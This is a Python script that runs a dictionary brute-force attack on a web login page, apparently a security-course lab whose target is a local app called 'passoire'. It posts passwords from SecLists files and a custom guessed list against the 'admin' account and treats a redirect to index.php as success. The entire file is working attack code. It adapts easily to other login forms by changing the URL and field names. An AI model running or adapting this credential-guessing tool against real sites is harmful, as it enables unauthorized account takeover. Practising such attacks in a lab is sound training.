import requests
import time
from urllib.parse import urljoin
from pathlib import Path

def read_password_list(filename):
    """Read passwords from file and return as list"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filename}: {e}")
        return []

def try_login(session, base_url, username, password):
    """Attempt login and return True if successful"""
    login_url = urljoin(base_url, "/passoire/connexion.php")
    
    data = {
        "login": username,
        "password": password
    }
    
    try:
        response = session.post(login_url, data=data, allow_redirects=True)
        
        # Only print progress every 100 attempts to avoid spam
        if try_login.counter % 100 == 0:
            print(f"Attempts made: {try_login.counter}")
        try_login.counter += 1
        
        # Success detection: check if we got redirected to index.php
        if "index.php" in response.url:
            print(f"\nSUCCESS! Password found:")
            print(f"Username: {username}")
            print(f"Password: {password}")
            return True
            
        return False
        
    except requests.exceptions.RequestException as e:
        print(f"Error during login attempt: {e}")
        return False

# Initialize counter as static variable
try_login.counter = 0

def main():
    base_url = "http://localhost:8080"
    #username = "john_doe"
    #username = "jane_smith"
    username = "admin"
    
    # Password list paths
    base_path = Path("/mnt/c/Users/Fredrik/OneDrive/Desktop/INTSEC/SecLists/Passwords")
    password_files = [
        base_path / "2023-200_most_used_passwords.txt",
        base_path / "common_corporate_passwords.lst",
        base_path / "probable-v2-top1575.txt"
    ]
    
    # Security-focused passwords based on chat content
    security_passwords = [
        "passoire", "Passoire2024", "SecureHash2024",
        "Bcrypt123!", "Argon2id", "SecurityFirst",
        "HashMaster", "CryptoExpert", "PasswordHash",
        "Security123", "Crypto2024", "SafePassword",
        # Variations of 'passoire'
        "Passoire123", "passoire123", "PASSOIRE",
        "P@ssoire", "P@ssoire123", "p@ssoire",
        # Security terms
        "Bcrypt", "Argon2", "SHA256",
        "HashFunction", "SecureHash"
    ]
    
    # Collect all passwords
    passwords = set(security_passwords)  # Use set to avoid duplicates
    
    print("Loading password lists...")
    for file in password_files:
        file_passwords = read_password_list(str(file))
        print(f"Loaded {len(file_passwords)} passwords from {file.name}")
        passwords.update(file_passwords)
    
    print(f"\nStarting brute force attack for user: {username}")
    print(f"Testing {len(passwords)} unique passwords...")
    
    session = requests.Session()  # Create one session for all attempts
    
    for password in passwords:
        if try_login(session, base_url, username, password):
            return
        
        # Small delay to avoid overwhelming the server
        time.sleep(0.1)
    
    print("\nNo valid credentials found from password lists.")
    print(f"Total attempts made: {try_login.counter}")

if __name__ == "__main__":
    main()
